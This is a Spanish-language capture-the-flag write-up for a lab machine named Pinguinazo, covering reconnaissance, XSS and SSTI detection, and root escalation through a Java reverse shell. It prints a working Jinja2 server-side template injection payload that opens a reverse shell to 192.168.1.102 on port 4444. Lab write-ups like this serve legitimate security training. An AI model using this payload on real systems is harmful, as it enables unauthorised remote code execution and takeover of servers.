# RESOLUCIÓN DE LA MÁQUINA PINGUINAZO

Abrimos la máquina y vemos su IP.

![image](https://github.com/user-attachments/assets/6db4d738-c294-4342-80e5-98d16f079a35)

Hacemos un nmap para poder ver los puertos que estan abiertos para la IP seleccionada.

![image](https://github.com/user-attachments/assets/50187b0b-16d7-4c70-bf52-3dad4b465d09)

Ahora hacemos un escaneo de el puerto que hemos visto que está abierto para saber servicios,versiones...

![image](https://github.com/user-attachments/assets/a9eb55e6-6e76-4f15-be88-969ed256f0f0)

Abrimos la web del puerto 5000.

![image](https://github.com/user-attachments/assets/7ac4c78d-5b00-40a8-bd69-eaccd8605f63)

Ahora hacemos uso de la herramienta whatweb.

![image](https://github.com/user-attachments/assets/43ff1af2-3173-4b48-9dbd-74b13652e77f)

Rellenamos los campos de la web y nos muestra esto: 

![image](https://github.com/user-attachments/assets/3b71bb80-dca0-4832-8623-c7f14b81e03c)

Como no encontramos nada vamos a hacer fuerza bruta con gobuster.

![image](https://github.com/user-attachments/assets/7fe95089-7270-45e1-a5cc-7bf04f644ff6)

Abrimos el directorio /console y vemos esto: 

![image](https://github.com/user-attachments/assets/a542d351-43ab-4073-abaa-31c44c4ba285)

Cuando le damos a "CONFIRM PIN", me salta un alert, quiere decir que alomejor es vulnerable a inyección xss.

![image](https://github.com/user-attachments/assets/e049a5b1-5e64-4e8b-b365-45193871dd7b)

Hacemos xss.

![image](https://github.com/user-attachments/assets/1dce850c-1ec6-4824-ab1a-a49b5e9201ed)

Y nos salta el alert, así que ya sabemos que la web es vulnerable a Cross-Site Scripting (XSS).

![image](https://github.com/user-attachments/assets/6cbc2fb4-339b-46a1-8629-4ac2c416199f)

También es vulnerable a SSTI.

![image](https://github.com/user-attachments/assets/26d3b9ab-139f-4728-bf9c-31b6415f2135)

![image](https://github.com/user-attachments/assets/c62312d9-00bd-4a2c-bcb8-10ab8d1f00ff)

Sabiendo que es vulnerable a SSTI intentamos inyectar código para que nos de el id.

El código esta en el apartado de python / jinja, ya que es lo que usa la web.

Esta es la web: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection

![image](https://github.com/user-attachments/assets/663a9eca-a49e-4c58-9173-3154d7fa00cc)

![image](https://github.com/user-attachments/assets/bd546821-b853-48fd-8e59-7afb8107ed16)

Hacemos una revershell desde el cuestionario de la web y ganamos acceso.

![image](https://github.com/user-attachments/assets/f00345c1-272a-4b50-844c-3d0b9b78d7d8)

El código que hemos usado para poder ganar acceso a la máquina es este: 

{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('bash -c "sh -i >& /dev/tcp/192.168.1.102/4444 0>&1"').read().zfill(417)}} {% endif %} {% endfor %}

Hacemos sudo -l y vemos esto:

![image](https://github.com/user-attachments/assets/2a500514-54b0-4812-b31a-f601c2e46509)

Creamos un archivo shell.java con una revershell (java).

![image](https://github.com/user-attachments/assets/36a5377e-235c-4dd0-a9c2-2709ab14619b)

Ejecutamos el comando.

![image](https://github.com/user-attachments/assets/79542497-31bd-49d1-ad42-97be6ba877ef)

Nos ponemos en escucha en otra terminal y ganamos acceso como root.

![image](https://github.com/user-attachments/assets/beb2ddac-1526-491b-9df9-784b9c5ddc6d)



